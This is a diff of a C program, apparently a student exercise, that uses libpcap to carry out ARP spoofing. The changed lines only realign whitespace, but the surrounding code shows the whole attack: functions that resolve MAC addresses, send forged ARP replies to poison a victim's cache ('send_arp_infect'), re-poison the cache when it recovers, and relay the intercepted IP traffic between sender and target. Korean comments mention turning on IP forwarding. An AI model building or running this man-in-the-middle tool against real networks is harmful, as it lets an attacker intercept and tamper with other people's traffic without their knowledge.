@@ -60,8 +60,8 @@ typedef struct {
 pcap_t* handle;
 uint8_t my_mac[6];
 uint8_t my_ip[4];
-Flow    flows[MAX_FLOWS];
-int     flow_cnt = 0;
+Flow flows[MAX_FLOWS];
+int flow_cnt = 0;
 
 //이 부분을 재부팅떄마다 터미널에 안해줬었더니 잘 패킷이 안잡혔어서 아예 넣음
 void set_ip_forward(const char* iface) {
@@ -105,10 +105,10 @@ void get_mac_by_arp(uint8_t* target_ip, uint8_t* out_mac) {
     req.arp.hln  = 6;
     req.arp.pln  = 4;
     req.arp.op   = htons(1);
-    memcpy(req.arp.smac, my_mac,     6);
-    memcpy(req.arp.sip,  my_ip,      4);
-    memset(req.arp.tmac, 0x00,        6);
-    memcpy(req.arp.tip,  target_ip,   4);
+    memcpy(req.arp.smac, my_mac, 6);
+    memcpy(req.arp.sip, my_ip, 4);
+    memset(req.arp.tmac, 0x00, 6);
+    memcpy(req.arp.tip, target_ip, 4);
 
     while (1) {
         pcap_sendpacket(handle, (const u_char*)&req, sizeof(req));
@@ -122,7 +122,7 @@ void get_mac_by_arp(uint8_t* target_ip, uint8_t* out_mac) {
 
             EthArpPacket* pkt = (EthArpPacket*)raw;
             if (ntohs(pkt->eth.type) == 0x0806 &&
-                ntohs(pkt->arp.op)   == 2       &&
+                ntohs(pkt->arp.op) == 2 &&
                 memcmp(pkt->arp.sip, target_ip, 4) == 0) {
                 memcpy(out_mac, pkt->arp.smac, 6);
                 return;
@@ -136,17 +136,17 @@ void get_mac_by_arp(uint8_t* target_ip, uint8_t* out_mac) {
 void send_arp_infect(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip) {
     EthArpPacket rep;
     memcpy(rep.eth.dmac, sender_mac, 6);
-    memcpy(rep.eth.smac, my_mac,     6);
+    memcpy(rep.eth.smac, my_mac, 6);
     rep.eth.type = htons(0x0806);
     rep.arp.hrd  = htons(1);
     rep.arp.pro  = htons(0x0800);
     rep.arp.hln  = 6;
     rep.arp.pln  = 4;
     rep.arp.op   = htons(2);
-    memcpy(rep.arp.smac, my_mac,     6);
-    memcpy(rep.arp.sip,  target_ip,  4);
+    memcpy(rep.arp.smac, my_mac, 6);
+    memcpy(rep.arp.sip,  target_ip, 4);
     memcpy(rep.arp.tmac, sender_mac, 6);
-    memcpy(rep.arp.tip,  sender_ip,  4);
+    memcpy(rep.arp.tip,  sender_ip, 4);
     pcap_sendpacket(handle, (const u_char*)&rep, sizeof(rep));
 }
 
@@ -155,7 +155,7 @@ void relay_ip_packet(const u_char* raw, int len, uint8_t* new_dmac) {
     u_char* buf = (u_char*)malloc(len);
     memcpy(buf, raw, len);
     EthHdr* eth = (EthHdr*)buf;
-    memcpy(eth->smac, my_mac,   6);
+    memcpy(eth->smac, my_mac, 6);
     memcpy(eth->dmac, new_dmac, 6);
     pcap_sendpacket(handle, buf, len);
     free(buf);
@@ -165,8 +165,8 @@ void relay_ip_packet(const u_char* raw, int len, uint8_t* new_dmac) {
 void check_and_reinfect(EthArpPacket* pkt) {
     for (int i = 0; i < flow_cnt; i++) {
         // target이 sender한테 ARP 보낼때 recover 발생
-        if (memcmp(pkt->arp.sip,  flows[i].target_ip,  4) == 0 &&
-            memcmp(pkt->eth.dmac, flows[i].sender_mac,  6) == 0) {
+        if (memcmp(pkt->arp.sip,  flows[i].target_ip, 4) == 0 &&
+            memcmp(pkt->eth.dmac, flows[i].sender_mac, 6) == 0) {
             send_arp_infect(flows[i].sender_mac,
                             flows[i].sender_ip,
                             flows[i].target_ip);
@@ -207,13 +207,13 @@ void packet_loop() {
         if (type == 0x0800) {
             IpHdr* ip = (IpHdr*)(raw + sizeof(EthHdr));
             for (int i = 0; i < flow_cnt; i++) {
-                if (memcmp(eth->dmac, my_mac,           6) == 0 &&
-                    memcmp(ip->sip,   flows[i].sender_ip, 4) == 0) {
+                if (memcmp(eth->dmac, my_mac, 6) == 0 &&
+                    memcmp(ip->sip, flows[i].sender_ip, 4) == 0) {
                     relay_ip_packet(raw, len, flows[i].target_mac);
                     break;
                 }
-                if (memcmp(eth->dmac, my_mac,           6) == 0 &&
-                    memcmp(ip->sip,   flows[i].target_ip, 4) == 0) {
+                if (memcmp(eth->dmac, my_mac, 6) == 0 &&
+                    memcmp(ip->sip, flows[i].target_ip, 4) == 0) {
                     relay_ip_packet(raw, len, flows[i].sender_mac);
                     break;
                 }
